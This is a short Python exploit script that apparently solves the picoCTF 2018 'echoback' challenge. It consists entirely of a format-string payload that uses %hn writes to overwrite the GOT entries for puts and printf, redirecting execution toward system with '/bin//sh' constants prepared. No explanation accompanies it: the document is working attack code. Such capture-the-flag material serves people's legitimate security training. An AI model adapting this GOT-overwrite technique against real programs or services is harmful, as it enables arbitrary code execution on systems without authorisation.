import struct
from pwn import *
#r = remote('2018shell.picoctf.com', 37402)
#r = process('./echoback')
VULN = 0x080485ab
PUTS_PLT = 0x0804a01c
BEFORE_SYS = 0x80485dc
SYS_PLT = 0x804a020
PRINTF = 0x804a010
RETURN_ADDR = 0xffffcdac
SYSTEM = 0xf7e0fc00
EBP08 = 0xffffcdb4
binaddr = 0xffffcd40
ouraddr = 0x8048739
esp = 0xffffccfc
binn = 0x6e69622f
sh = 0x68732f2f
sys = 0x8048460

exploit = ''
exploit += struct.pack("I", PUTS_PLT)
exploit += struct.pack("I", PUTS_PLT+2)
exploit += "%7$34211x"
exploit += "%7$hn"
exploit += "%8$33369x"
exploit += "%8$hn"
exploit += struct.pack("I", PRINTF)
exploit += struct.pack("I", PRINTF+2)
exploit += "%16$31828x"
exploit += "%16$hn"
exploit += "%17$33700x"
exploit += "%17$hn"

print exploit


